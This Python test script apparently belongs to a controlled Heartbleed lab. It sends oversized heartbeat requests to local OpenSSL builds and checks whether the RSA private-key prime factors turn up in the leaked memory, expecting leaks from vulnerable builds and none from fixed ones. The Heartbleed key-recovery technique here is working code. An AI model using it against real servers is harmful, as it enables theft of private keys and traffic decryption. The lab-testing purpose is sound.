"""Independent key/fixed controls for the explicitly conditioned lab heap."""
from pathlib import Path
import base64
import hashlib
import json
import re
import socket
import ssl
import subprocess
import sys

from wire import heartbeat, providers as all_providers, root

providers = {name: row for name, row in all_providers.items() if row['kind'] == 'conditioned'}

after = sys.argv[1:] == ['after']
record = {'status': 'running', 'conditioned': True, 'module_calls': 0, 'cases': [], 'boundary_cases': []}
try:
    for manifest in ['binaries.sha256', 'conditioned-binaries.sha256']:
        subprocess.run(['sha256sum', '-c', '/opt/openssl/' + manifest], cwd='/opt/openssl', capture_output=True, text=True, check=True)
        record[manifest] = Path('/opt/openssl', manifest).read_text()
    private = subprocess.check_output(['openssl', 'rsa', '-in', str(root / 'key.pem'), '-text', '-noout'], text=True, stderr=subprocess.DEVNULL)
    factors = {}
    for name in ['prime1', 'prime2']:
        section = re.search(name + r':\s*\n((?:\s+[0-9a-f:]+\n)+)', private)
        assert section, name
        factors[name] = int(re.sub(r'\s|:', '', section.group(1)), 16)
    modulus = subprocess.check_output(['openssl', 'x509', '-in', str(root / 'cert.pem'), '-noout', '-modulus'], text=True).strip().split('=', 1)[1]
    assert factors['prime1'] * factors['prime2'] == int(modulus, 16)
    width = int(modulus, 16).bit_length() // 16
    record['certificate_sha256'] = hashlib.sha256((root / 'cert.pem').read_bytes()).hexdigest()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers('AES128-SHA:@SECLEVEL=0')
    for name, provider in providers.items():
        for protocol in ([0x0303] if after else [0x0301, 0x0302, 0x0303]):
            for valid in [True, False]:
                outcome = heartbeat(provider['port'], protocol, 32768, valid=valid)
                leaked = base64.b64decode(outcome.get('payload_base64', ''))
                offsets = {factor: leaked.find(value.to_bytes(width, 'little')) for factor, value in factors.items()}
                row = {'name': name, 'tls_version': protocol, 'valid': valid, 'factor_offsets': offsets, 'outcome': outcome}
                record['cases'].append(row)
                if name.endswith('disabled'):
                    assert not leaked, (name, outcome)
                elif valid:
                    assert outcome.get('valid_echo'), (name, outcome)
                elif name.endswith('fixed'):
                    assert not leaked, (name, outcome)
                else:
                    assert outcome.get('received_payload_bytes') == 32768, (name, outcome)
                    assert offsets['prime1'] >= 16384, (name, offsets)
                    assert b'HEARTBLEED_LAB_FACTOR' in leaked
        for declared in ([] if after else [1, 65535]):
            outcome = heartbeat(provider['port'], 0x0301, declared)
            leaked = base64.b64decode(outcome.get('payload_base64', ''))
            record.setdefault('boundary_cases', []).append({'name': name, 'declared': declared, 'outcome': outcome})
            if name.endswith(('fixed', 'disabled')):
                assert not leaked, (name, declared, outcome)
            else:
                assert len(leaked) == declared, (name, declared, outcome)
                if declared == 65535:
                    assert leaked.find(factors['prime1'].to_bytes(width, 'little')) >= 16384
        with socket.create_connection(('127.0.0.1', provider['port']), timeout=3) as raw:
            with context.wrap_socket(raw, server_hostname='heartbleed.invalid') as secure:
                provider['healthy_after'] = secure.version()
        record['providers'] = providers
    record['status'] = 'passed'
finally:
    (root / 'conditioned-native.json').write_text(json.dumps(record, indent=2) + '\n')
print(json.dumps(record))
